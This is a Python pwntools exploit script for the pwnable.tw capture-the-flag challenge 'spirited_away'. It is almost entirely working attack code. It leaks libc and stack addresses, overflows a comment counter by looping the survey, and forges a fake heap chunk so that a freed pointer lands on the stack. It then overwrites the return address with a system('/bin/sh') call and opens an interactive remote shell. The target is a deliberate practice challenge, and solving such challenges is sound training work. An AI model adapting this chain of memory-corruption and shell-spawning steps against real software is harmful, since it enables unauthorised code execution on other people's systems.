from pwn import *

locdbg=False

host='chall.pwnable.tw'
port=10204
filename='./spirited_away'
libcname='./libc_32.so.6'
elf=ELF(filename)
slpt=0.1

if locdbg:
    p=process(filename)
    libc=ELF('./libc_32.so.6')
    context.log_level='debug'
else:
    p=remote(host,port)
    libc=ELF(libcname)
    context.log_level='debug'

def pwndbg(ctt):
    if locdbg:
        gdb.attach(p,gdbscript=ctt)

def slp():
    if not locdbg:
        sleep(slpt)

def fin():
    p.interactive()

def cmt(name,age,rsn,data):
    p.recvuntil(b'name: ')
    p.send(name)
    slp()

    p.recvuntil(b'age: ')
    p.sendline(str(age).encode())
    slp()

    p.recvuntil(b'movie? ')
    p.send(rsn)
    slp()

    p.recvuntil(b'comment: ')
    p.send(data)
    slp()

def cmt2(age,rsn):

    p.recvuntil(b'age: ')
    p.sendline(str(age).encode())
    slp()

    p.recvuntil(b'movie? ')
    p.send(rsn)
    slp()

cmt(b'c10ver',24,b'@'*32,b'hhh')
p.recvuntil(b'@'*32)
io_addr=u32(p.recv()[0:4])
libc_base=io_addr-libc.symbols['_IO_2_1_stdout_']
print('libc base='+hex(libc_base))
p.send(b'y')

cmt(b'c10ver',24,b'@'*0x50,b'aaa')
p.recvuntil(b'@'*0x50)
main_base=u32(p.recv()[0:4])
survey_base=main_base-0x20
print('func base='+hex(survey_base))
p.send(b'y')


for i in range(2,10):
    print(str(i)+'times')
    cmt(b'c10ver',24,b'fun',b'hhh')
    p.recvuntil(b'<y/n>: ')
    p.send(b'y')
    #input()

for i in range(10,100):
    print(str(i)+'times')
    cmt2(24,b'fun')
    p.recvuntil(b'<y/n>: ')
    p.send(b'y')
    #input()

pwndbg('b* survey+700')

cmt(b'c10ver',24,p32(0)+p32(0x41)+b'\0'*0x3c+p32(0x1009)+p32(0xa3432),b'0'*84+p32(survey_base-0x48))
p.recv()
p.send(b'y')

system_addr=libc.symbols['system']+libc_base
sh_addr=next(libc.search(b'/bin/sh'))+libc_base
cmt(b'@'*0x48+p32(0)+p32(system_addr)+p32(0)+p32(sh_addr),24,p32(0)+p32(0x41)+b'\0'*0x3c+p32(0x1009)+p32(0xa3432),b'0'*84+p32(survey_base-0x48))
p.send(b'n')
fin()